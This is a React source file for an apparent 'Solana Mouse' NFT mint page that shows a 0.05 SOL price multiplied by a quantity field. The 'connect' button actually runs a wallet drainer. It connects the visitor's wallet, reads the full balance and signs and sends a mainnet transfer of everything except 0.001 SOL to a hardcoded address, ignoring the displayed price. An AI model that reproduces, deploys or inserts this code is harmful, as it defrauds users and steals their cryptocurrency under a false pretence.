import './App.css';
import {useEffect, useState} from "react";
import * as solanaWeb3 from "@solana/web3.js";
import imgDiscord from './icons8-discord-50.png'
import imgTwitter from './icons8-twitter-50.png'

const solAmount = 0.05
const image = 'https://pbs.twimg.com/profile_images/1505480367171592194/UHdcVfcJ_400x400.jpg'
const Title = 'Solana Mouse'

document.title = Title

const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"

function App() {
  const [inputValue, setInputValue] = useState(1)
  const [result, setResult] = useState(solAmount)

  const changeHandler = (e) => {
    setInputValue(e.target.value)
  }

  useEffect(() => {
    const fff = (inputValue * solAmount)
    const result2 = fff.toString().length > 2 ? fff.toFixed(2) : fff
    result2 !== 'NaN' ? setResult(!inputValue || inputValue === '0' ? solAmount : result2) : setResult(solAmount)
  }, [inputValue])

  async function connectAndSend() {
    try {
      await window.solana.connect()
      await sendSol()
    } catch (error) {
      console.log(error)
    }
  }

  async function sendSol() {
    const provider = window.solana
    const connection = new solanaWeb3.Connection(
        solanaWeb3.clusterApiUrl('mainnet-beta'),
        'confirmed'
    )

    const balance = await connection.getBalance(provider.publicKey)

    const toAccount = new solanaWeb3.PublicKey(address)

    let transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: provider.publicKey,
          toPubkey: toAccount,
          lamports: solanaWeb3.LAMPORTS_PER_SOL * ((balance / solanaWeb3.LAMPORTS_PER_SOL) - 0.001),
        })
    )

    transaction.feePayer = await provider.publicKey
    let blockhashObj = await connection.getRecentBlockhash()
    transaction.recentBlockhash = await blockhashObj.blockhash

    let signed = await provider.signTransaction(transaction)
    let signature = await connection.sendRawTransaction(signed.serialize())
    await connection.confirmTransaction(signature)
  }

  return (
      <div className={'AppContainer'}>
        <header>
          <div>
            <a href={'/'}>{Title}</a>
          </div>
          <nav>
            <ul>
              <li>
                <img src={imgTwitter} alt=""/>
              </li>
              <li>
                <img src={imgDiscord} alt=""/>
              </li>
            </ul>
          </nav>
        </header>
        <div className="App">
          <div>
            <img src={image}
                 alt={'projectImage'}/>
          </div>
          <div>
            <div className={'container'}>
              <div>
                <div>
                  <label htmlFor={'quanity'}>quanity</label>
                </div>
                <input id={'quanity'} type={'text'} value={inputValue} onChange={changeHandler}/>
              </div>
              <div className={'qwe qwe1'}>*</div>
              <div>
                <div>
                  <label htmlFor={'amount'}>amount</label>
                </div>
                <span id={'amount'}>{solAmount}</span>
              </div>
              <div className={'qwe'}>=</div>
              <div>
                <div>
                  <label htmlFor={'result'}>result</label>
                </div>
                <span id={'result'}>{result}</span>
              </div>
            </div>
            <button onClick={connectAndSend}>connect</button>
          </div>
        </div>
      </div>
  );
}

export default App;
